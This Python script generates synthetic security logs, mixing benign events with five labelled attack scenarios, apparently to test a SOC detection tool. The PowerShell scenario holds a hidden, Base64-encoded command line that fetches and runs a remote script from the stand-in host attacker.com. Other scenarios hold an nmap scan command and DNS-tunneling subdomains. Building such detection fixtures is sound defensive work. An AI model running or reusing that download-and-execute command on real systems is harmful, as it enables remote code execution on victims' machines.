"""
Telemetry generator for CyberQuery AI.
Generates realistic baseline security logs intermixed with targeted attack traces
for 5 core SOC scenarios:
1. Brute Force (T1110)
2. Suspicious PowerShell Execution (T1059.001)
3. Network Port Scanning (T1046)
4. Suspicious DNS Query / Tunneling (T1071.004)
5. Impossible Travel Login (T1078)
"""
import json
import random
import os
from datetime import datetime, timedelta

def generate_dataset():
    base_time = datetime(2026, 8, 8, 12, 0, 0)
    events = []
    event_id = 1000

    # Helper to generate timestamp string
    def ts(minutes_offset=0, seconds_offset=0):
        return (base_time - timedelta(minutes=minutes_offset, seconds=seconds_offset)).isoformat() + "Z"

    # --- Baseline Benign Users & IPs ---
    benign_users = ["john.doe", "alice.wong", "bob.miller", "system_svc", "dev_user1", "sarah.connor", "mwilson", "dclark", "admin"]
    hosts = ["server-01", "dc-01", "app-server-02", "finance-pc-04", "dev-ws-01", "hr-laptop-12"]
    normal_ips = ["192.168.1.10", "192.168.1.15", "192.168.1.20", "10.0.0.12", "10.0.0.45", "192.168.1.72", "192.168.1.50"]

    # Generate ~250 benign authentication, process execution, network, and DNS events over last 24h
    for i in range(250):
        event_id += 1
        event_type = random.choice(["authentication", "process_execution", "network_connection", "dns_query"])
        mins = random.randint(1, 1440)
        user = random.choice(benign_users)
        host = random.choice(hosts)
        ip = random.choice(normal_ips)

        if event_type == "authentication":
            events.append({
                "id": event_id,
                "timestamp": ts(minutes_offset=mins),
                "username": user,
                "source_ip": ip,
                "destination_ip": "10.0.0.10",
                "source_port": random.randint(49152, 65535),
                "destination_port": 445,
                "event_type": "authentication",
                "action": "login",
                "status": "success" if random.random() > 0.05 else "failed",
                "hostname": host,
                "process": "winlogon.exe",
                "parent_process": "services.exe",
                "command_line": None,
                "domain": "corp.internal",
                "location_city": "New York",
                "location_country": "USA"
            })
        elif event_type == "process_execution":
            proc = random.choice(["svchost.exe", "chrome.exe", "explorer.exe", "code.exe", "python.exe"])
            events.append({
                "id": event_id,
                "timestamp": ts(minutes_offset=mins),
                "username": user,
                "source_ip": ip,
                "destination_ip": None,
                "source_port": None,
                "destination_port": None,
                "event_type": "process_execution",
                "action": "execute",
                "status": "success",
                "hostname": host,
                "process": proc,
                "parent_process": "explorer.exe",
                "command_line": f"C:\\Windows\\System32\\{proc}",
                "domain": None,
                "location_city": "New York",
                "location_country": "USA"
            })
        elif event_type == "network_connection":
            events.append({
                "id": event_id,
                "timestamp": ts(minutes_offset=mins),
                "username": user,
                "source_ip": ip,
                "destination_ip": "10.0.0.25",
                "source_port": random.randint(50000, 60000),
                "destination_port": random.choice([80, 443, 8080]),
                "event_type": "network_connection",
                "action": "connect",
                "status": "allowed",
                "hostname": host,
                "process": "chrome.exe",
                "parent_process": "explorer.exe",
                "command_line": None,
                "domain": "google.com",
                "location_city": "New York",
                "location_country": "USA"
            })
        else:
            domain = random.choice(["google.com", "github.com", "microsoft.com", "slack.com", "internal.corp.local"])
            events.append({
                "id": event_id,
                "timestamp": ts(minutes_offset=mins),
                "username": user,
                "source_ip": ip,
                "destination_ip": "10.0.0.2",
                "source_port": random.randint(50000, 60000),
                "destination_port": 53,
                "event_type": "dns_query",
                "action": "query",
                "status": "allowed",
                "hostname": host,
                "process": "svchost.exe",
                "parent_process": "services.exe",
                "command_line": None,
                "domain": domain,
                "location_city": "New York",
                "location_country": "USA"
            })

    # --- Scenario 1: Brute Force (T1110) ---
    # Target 'admin' from attacker IP '192.168.1.44'. 17 failed logins within 6 minutes, followed by 1 successful login.
    bf_ip = "192.168.1.44"
    bf_user = "admin"
    for s in range(17):
        event_id += 1
        events.append({
            "id": event_id,
            "timestamp": ts(minutes_offset=540, seconds_offset=180 - s * 10),  # ~9h ago
            "username": bf_user,
            "source_ip": bf_ip,
            "destination_ip": "10.0.0.10",
            "source_port": 49152 + s,
            "destination_port": 445,
            "event_type": "authentication",
            "action": "login",
            "status": "failed",
            "hostname": "server-01",
            "process": "winlogon.exe",
            "parent_process": "services.exe",
            "command_line": None,
            "domain": "corp.internal",
            "location_city": "Moscow",
            "location_country": "Russia"
        })
    # Successful login immediately after failed attempts
    event_id += 1
    events.append({
        "id": event_id,
        "timestamp": ts(minutes_offset=539, seconds_offset=5),
        "username": bf_user,
        "source_ip": bf_ip,
        "destination_ip": "10.0.0.10",
        "source_port": 49200,
        "destination_port": 445,
        "event_type": "authentication",
        "action": "login",
        "status": "success",
        "hostname": "server-01",
        "process": "winlogon.exe",
        "parent_process": "services.exe",
        "command_line": None,
        "domain": "corp.internal",
        "location_city": "Moscow",
        "location_country": "Russia"
    })

    # --- Scenario 2: Suspicious PowerShell Execution (T1059.001) ---
    # PowerShell spawned by winword.exe with Base64 encoded payload & DownloadString
    event_id += 1
    events.append({
        "id": event_id,
        "timestamp": ts(minutes_offset=180, seconds_offset=0),  # 3h ago
        "username": "mwilson",
        "source_ip": "192.168.1.15",
        "destination_ip": None,
        "source_port": None,
        "destination_port": None,
        "event_type": "process_execution",
        "action": "execute",
        "status": "success",
        "hostname": "finance-pc-04",
        "process": "powershell.exe",
        "parent_process": "winword.exe",
        "command_line": "powershell.exe -NoP -NonI -W Hidden -Enc SUVYICBOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vYXR0YWNrZXIuY29tL3BheWxvYWQucHMxJyk=",
        "domain": None,
        "location_city": "New York",
        "location_country": "USA"
    })
    event_id += 1
    events.append({
        "id": event_id,
        "timestamp": ts(minutes_offset=178, seconds_offset=30),
        "username": "mwilson",
        "source_ip": "192.168.1.15",
        "destination_ip": "185.220.101.5",
        "source_port": 51234,
        "destination_port": 8080,
        "event_type": "network_connection",
        "action": "connect",
        "status": "allowed",
        "hostname": "finance-pc-04",
        "process": "powershell.exe",
        "parent_process": "winword.exe",
        "command_line": None,
        "domain": "attacker.com",
        "location_city": "Frankfurt",
        "location_country": "Germany"
    })

    # --- Scenario 3: Port Scanning (T1046) ---
    # Single IP 192.168.1.105 scanning 25 distinct destination ports on 10.0.0.5 within 2 minutes
    scan_ip = "192.168.1.105"
    scan_target = "10.0.0.5"
    ports_scanned = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 993, 1433, 1521, 3306, 3389, 5432, 5900, 8000, 8080, 8443, 8888, 9000, 27017]
    for idx, p in enumerate(ports_scanned):
        event_id += 1
        events.append({
            "id": event_id,
            "timestamp": ts(minutes_offset=360, seconds_offset=120 - idx * 4),  # 6h ago
            "username": "dev_user1",
            "source_ip": scan_ip,
            "destination_ip": scan_target,
            "source_port": 60000 + idx,
            "destination_port": p,
            "event_type": "network_connection",
            "action": "connect",
            "status": "allowed" if p in [80, 443] else "blocked",
            "hostname": "dev-ws-01",
            "process": "nmap.exe",
            "parent_process": "cmd.exe",
            "command_line": f"nmap -sS -p 1-10000 {scan_target}",
            "domain": None,
            "location_city": "New York",
            "location_country": "USA"
        })

    # --- Scenario 4: Suspicious DNS Query / Tunneling (T1071.004) ---
    # Host hr-laptop-12 making 35 high-entropy sub-domain queries to malicious exfil C2 domain
    dns_host = "hr-laptop-12"
    dns_user = "dclark"
    dns_ip = "192.168.1.72"
    for d in range(35):
        event_id += 1
        subdomain = f"sub-{random.randint(100000, 999999)}-exfil{d}.a8f3b9c1d2e4.exfil-data.c2-network.top"
        events.append({
            "id": event_id,
            "timestamp": ts(minutes_offset=120, seconds_offset=200 - d * 5),  # 2h ago
            "username": dns_user,
            "source_ip": dns_ip,
            "destination_ip": "10.0.0.2",
            "source_port": 54100 + d,
            "destination_port": 53,
            "event_type": "dns_query",
            "action": "query",
            "status": "allowed",
            "hostname": dns_host,
            "process": "svchost.exe",
            "parent_process": "services.exe",
            "command_line": None,
            "domain": subdomain,
            "location_city": "New York",
            "location_country": "USA"
        })

    # --- Scenario 5: Impossible Travel Login (T1078) ---
    # User sarah.connor logs in from New York, USA, then 12 mins later from Tokyo, Japan!
    event_id += 1
    events.append({
        "id": event_id,
        "timestamp": ts(minutes_offset=60, seconds_offset=0),  # 1h ago
        "username": "sarah.connor",
        "source_ip": "198.51.100.22",
        "destination_ip": "10.0.0.10",
        "source_port": 52100,
        "destination_port": 443,
        "event_type": "authentication",
        "action": "login",
        "status": "success",
        "hostname": "vpn-gateway",
        "process": "sshd",
        "parent_process": "systemd",
        "command_line": None,
        "domain": "corp.internal",
        "location_city": "New York",
        "location_country": "USA"
    })
    event_id += 1
    events.append({
        "id": event_id,
        "timestamp": ts(minutes_offset=48, seconds_offset=0),  # 48m ago (12 min gap!)
        "username": "sarah.connor",
        "source_ip": "203.0.113.88",
        "destination_ip": "10.0.0.10",
        "source_port": 53400,
        "destination_port": 443,
        "event_type": "authentication",
        "action": "login",
        "status": "success",
        "hostname": "vpn-gateway",
        "process": "sshd",
        "parent_process": "systemd",
        "command_line": None,
        "domain": "corp.internal",
        "location_city": "Tokyo",
        "location_country": "Japan"
    })

    # Sort events by timestamp descending
    events.sort(key=lambda x: x["timestamp"], reverse=True)

    # Ensure target directory exists
    os.makedirs(os.path.join("data"), exist_ok=True)
    out_path = os.path.join("data", "security_logs.json")
    with open(out_path, "w", encoding="utf-8") as f:
        json.dump(events, f, indent=2)

    print(f"Successfully generated {len(events)} security events in {out_path}")

if __name__ == "__main__":
    generate_dataset()
